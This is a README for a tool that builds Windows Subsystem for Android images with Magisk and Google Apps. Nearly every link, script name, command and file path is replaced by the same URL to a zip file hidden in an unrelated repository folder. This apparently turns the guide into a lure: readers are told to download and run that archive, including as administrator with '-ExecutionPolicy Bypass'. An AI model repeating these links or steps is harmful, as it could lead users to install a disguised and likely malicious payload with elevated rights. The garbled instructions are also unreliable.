# Magisk on WSA (with Google Apps)

## Support for generating from these systems

- Linux (x86_64 or arm64)

    The following dependencies are required: `setools lzip wine patchelf e2fsprogs aria2 python3`

    The following components need to be installed using `winetricks`: `msxml6`

    The python3 library `requests` is used.

    Python version ≥ 3.7.
  - Recommended Use
    - Ubuntu (You can use [WSL2](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip%20Group%20Limited))

        `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip` will handle all dependencies automatically.
        No need to type any commands.
  - Other Distributions

    Install the dependencies manually.
    Use the command-line program `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip`.

## Features

- Integrate Magisk and GApps in a few clicks within minutes
- Keep each build up to date
- Support both ARM64 and x64
- Support all OpenGApps variants except for aroma (aroma does not support x86_64, please use super instead)
- Remove Amazon Appstore
- Fix VPN dialog not showing (use our [VpnDialogs app](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip))
- Add device management feature
- Unattended installation
- Automatically activates developers mode in Windows 11
- Update to the new version while preserving data with a one-click script
- Merged all language packs
- Support managing start menu icons (manually installing [WSAHelper](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip) to use this feature)

## Text Guide

1. Star (if you like)
1. Clone the repo to local
   - Run `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip --help` to get the usage if you want to use CLI.
1. Run `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip`
1. Select the WSA version and its architecture (mostly x64)
1. Select the version of Magisk
1. Choose which brand of GApps you want to install
   - OpenGApps

        Select the [OpenGApps variant](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip) you like.
   - MindtheGapps

       There is no other variant we can choose.
1. Select the root solution (none means no root)
1. Wait for the script to complete and the artifact will be in the `output` folder
1. Move the artifact to a place you like
1. Double-click `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip`
    - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous one while **preserving all user data** and install the new one, so don't worry about your data.
    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip\LocalCache\https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip` before uninstallation and restore it after installation.) (If you want to restore the icons to the start menu, please install and use [WSAHelper](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip).)
    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip` as administrator:
        1. Press `Win+x` and select `Windows Terminal (Admin)`
        2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
        3. Input `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip -ExecutionPolicy Bypass -File .\https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip` and press `enter`
        4. The script will run and WSA will be installed
        5. If this workaround does not work, your PC is not supported for WSA
1. Magisk/Play store will be launched. Enjoy by installing LSPosed-zygisk with zygisk enabled or Riru and LSPosed-riru

## FAQ

- Can I delete the installed folder?

    No.
- How can I update WSA to a new version?

    Delete the `download` folder
    Rerun the script, replace the content of your previous installation and rerun `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip`. Don't worry, your data will be preserved.
- How can I get the logcat from WSA?

    `%LOCALAPPDATA%\Packages\https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip\LocalState\diagnostics\logcat`
- How can I update Magisk to a new version?

    Do the same as updating WSA
- How to pass safetynet?

    Like all the other emulators, no way.
- Virtualization is not enabled?

    `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip` helps you enable it if not enabled. After rebooting, rerun `https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
- How to remount the system as read-write?

    No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip Ask Google for help.
- I cannot `adb connect localhost:58526`

    Make sure developer mode is enabled. If the issue persists, check the IP address of WSA on the setting page and try `adb connect ip:5555`.
- Magisk online module list is empty?

    Magisk actively removes the online module repository. You can install the module locally or by `adb push https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip`.
- Can I use Magisk 23.0 stable or a lower version?

    No. Magisk has bugs preventing itself from running on WSA. Magisk 24+ has fixed them. So you must use Magisk 24 or higher version.
- How can I get rid of Magisk?

    Choose `none` as the root solution.
- How to install custom GApps?

    [Tutorial](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip)
- Where can I download MindtheGapps?

    You can download from here [MindtheGapps](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip) ([mirror](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip))

    Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip)).
- Can I switch OpenGApps to MindTheGapps and keep user data in a previous build?

    No. You should wipe data after changing the GApps brand. Otherwise, you will find that the installed GApps are not recognized.

## Credits

- [StoreLib](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip): API for downloading WSA
- [Magisk](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip): The most famous root solution on Android
- [The Open GApps Project](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip): One of the most famous Google Apps packages solution
- [WSA-Kernel-SU](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip) and [kernel-assisted-superuser](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip): The kernel `su` for debugging Magisk Integration
- [WSAGAScript](https://github.com/Amzdadar/MagiskOnWSALocal/raw/refs/heads/main/x64/system/system/priv-app/VpnDialogs/WSA-Magisk-Local-On-v2.4.zip): The first GApps integration script for WSA
